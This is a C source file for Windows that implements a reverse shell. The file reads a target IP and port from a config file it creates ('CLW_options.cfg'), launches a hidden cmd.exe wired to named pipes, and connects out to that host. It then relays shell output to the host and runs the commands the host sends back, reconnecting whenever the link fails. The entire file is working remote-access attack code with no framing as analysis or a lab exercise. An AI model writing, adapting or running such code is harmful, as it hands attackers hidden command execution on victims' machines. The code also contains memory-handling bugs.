#define _WIN32_WINNT 0x501
#define DEFAULT_BUFLEN 512

#include <windows.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>
#include <signal.h>

typedef struct Pipe0
{
    HANDLE HANDLES[4];
    int bufsize;
} * Pipe;
Pipe pipe;

char OUTPUT_text[4096];
DWORD OUTPUT_size;
char *IP;
char *PORT;
SECURITY_ATTRIBUTES sa;
STARTUPINFO si;
PROCESS_INFORMATION pi;

Pipe create_pipes();
PTSTR pipe_init();
int frompipe(HANDLE in, HANDLE ou);
int read_config();
void init_socket();

void SignalHandler(int signal)
{//START

}//END

Pipe create_pipes()
{//START
    long i;
    TCHAR PipeNameBuffer[MAX_PATH];
    PTSTR IO = "IO";
    DWORD open_modes[] = {PIPE_ACCESS_INBOUND, PIPE_ACCESS_OUTBOUND};
    DWORD access[] = {GENERIC_WRITE, GENERIC_READ};

    for (i = 0; i < 4; i++)
    {
        pipe->HANDLES[i] = INVALID_HANDLE_VALUE;
    }
    pipe->bufsize = 0;
    for (i = 0; i < 2; i++)
    {
        sprintf(PipeNameBuffer, "\\\\.\\pipe\\%c%08x", IO[i], GetCurrentProcessId());
        pipe->HANDLES[i * 2] = CreateNamedPipe(PipeNameBuffer, open_modes[i] | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, 1, 4096, 4096, 120 * 1000, 0);
        SetHandleInformation(pipe->HANDLES[i * 2], HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);
        pipe->HANDLES[i * 2 + 1] = CreateFile(PipeNameBuffer, access[i], 0, 0, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL);
    }

    return (pipe);
}//END

PTSTR pipe_init()
{//START
    PTSTR cmd = "c:\\Windows\\system32\\cmd.exe";
    pipe = malloc(1 * sizeof(PTSTR));

    create_pipes();

    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;
    si.cb = sizeof(si);
    si.lpReserved = NULL;
    si.lpDesktop = NULL;
    si.lpTitle = NULL;
    si.dwFlags = STARTF_USESTDHANDLES;
    si.cbReserved2 = 0;
    si.lpReserved2 = NULL;
    si.hStdInput = pipe->HANDLES[0];
    si.hStdOutput = pipe->HANDLES[2];
    si.hStdError = pipe->HANDLES[2];

    CreateProcess(NULL, cmd, &sa, NULL, TRUE, CREATE_NO_WINDOW | NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi);

    return NULL;
}//END

int frompipe(HANDLE in, HANDLE ou)
{//START
    OVERLAPPED overlap = {0};
    DWORD numberofbyte;
    char buffer[4096];
    DWORD read = 0;
    DWORD ew;
    for (;;)
    {
        Sleep(300);
        if (ReadFile(in, buffer, sizeof(buffer), &numberofbyte, &overlap))
        {
            OUTPUT_size = numberofbyte;
            strncpy(OUTPUT_text, buffer, numberofbyte);
        }
        if(GetExitCodeProcess(pi.hProcess, &ew) && ew != STILL_ACTIVE)
        {
            exit(ew);
        }
        return numberofbyte;
    }
}//END

void init_socket()
{//START
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo *result = NULL,
                    *ptr = NULL,
                    hints;
    char buffer[1000];
    char recvbuf[DEFAULT_BUFLEN];
    int sended = 0;
    int iResult;
    int recvbuflen = DEFAULT_BUFLEN;

    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    iResult = getaddrinfo(IP, PORT, &hints, &result);

    for (ptr = result; ptr != NULL; ptr = ptr->ai_next)
    {
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR)
        {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
        }
        break;
    }
    freeaddrinfo(result);

    pipe_init();

    for (;;)
    {
        Sleep(300);
        if (!sended)
        {
            frompipe(pipe->HANDLES[3], NULL);
            if (OUTPUT_size > 0)
            {
                send(ConnectSocket, OUTPUT_text, 4096, 0);
            }
            memset(OUTPUT_text, 0, 4096);
            sended = 1;
        }
        else
        {
            iResult = recv(ConnectSocket, buffer, recvbuflen, 0);
            if (iResult == SOCKET_ERROR)
            {
                closesocket(ConnectSocket);
                ConnectSocket = INVALID_SOCKET;
                for (int h = 0; h < 4; h++)
                {
                    CloseHandle(pipe->HANDLES[h]);
                }
                main();
            }
            if (iResult)
            {
                WriteFile(pipe->HANDLES[1], buffer, strlen(buffer), NULL, 0);
                memset(buffer, 0, 1000);
                buffer[0] = '\0';
                sended = 0;
            }
        }
    }
    closesocket(ConnectSocket);
    WSACleanup();
}//END

int read_config()
{//START
    char *content = "IP=127.0.0.1\nPORT=8888";
    char *file_name = "CLW_options.cfg";
    char buffer[60];
    int bufferSize = 0;
    char TMPIPbuffer[19];
    char TMPPORTbuffer[6];

    FILE *fp;
    fp = fopen(file_name, "r");

    if (fp == NULL)
    {
        fp = fopen(file_name, "w");
        for (int i = 0; content[i] != '\0'; i++)
        {
            fputc(content[i], fp);
        }
        fclose(fp);
        return 1;
    }

    while(!feof(fp))
    {
        fread(buffer, 60, 1, fp);
    }
    fclose(fp);

    if(buffer[0] != 'I' || buffer[1] != 'P' || buffer[2] != '='){
        remove(file_name);
        read_config();
    }

    for(int i = 0; i<20; i++){
        if(buffer[i] == '\n'){
            buffer[i] = '\0';
            break;
        }
    }

    bufferSize = strlen(buffer);
    IP = malloc(strlen(buffer)*sizeof(char));

    for(int i = 0; i<sizeof(buffer); i++){
        if(i > 2){
            TMPIPbuffer[i-3] = buffer[i];
        }
    }
    strcpy(IP, TMPIPbuffer);

    fp = fopen(file_name, "r");
    while(!feof(fp))
    {
        fread(buffer, 60, 1, fp);
    }
    fclose(fp);

    if(buffer[bufferSize+1] != 'P' || buffer[bufferSize+2] != 'O' || buffer[bufferSize+3] != 'R' || buffer[bufferSize+4] != 'T' || buffer[bufferSize+5] != '='){
        remove(file_name);
        read_config();
    }

    for(int i = bufferSize+1; i<bufferSize+13; i++){
        if(buffer[i] == '\n'){
            buffer[i] = '\0';
            break;
        }
    }

    int c = 0;
    while(isdigit((int)buffer[bufferSize+6+c])){
        TMPPORTbuffer[c] = buffer[bufferSize+6+c];
        c++;
        if(c == 5){
            break;
        }
    }
    TMPPORTbuffer[c] = '\0';

    PORT = malloc(strlen(buffer)*sizeof(char));
    strcpy(PORT, TMPPORTbuffer);
    return 0;
}//END

int main()
{//START
    typedef void (*SignalHandlerPointer)(int);
    int conf_error;

    SignalHandlerPointer previousHandler;
    previousHandler = signal(SIGABRT, SignalHandler);

    conf_error = read_config();
    if(conf_error){
        read_config();
    }

    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)init_socket, NULL, 0, NULL);
    int a = 0;
    for (;;)
    {
        scanf("%d", &a);
    }
    return 0;
}//END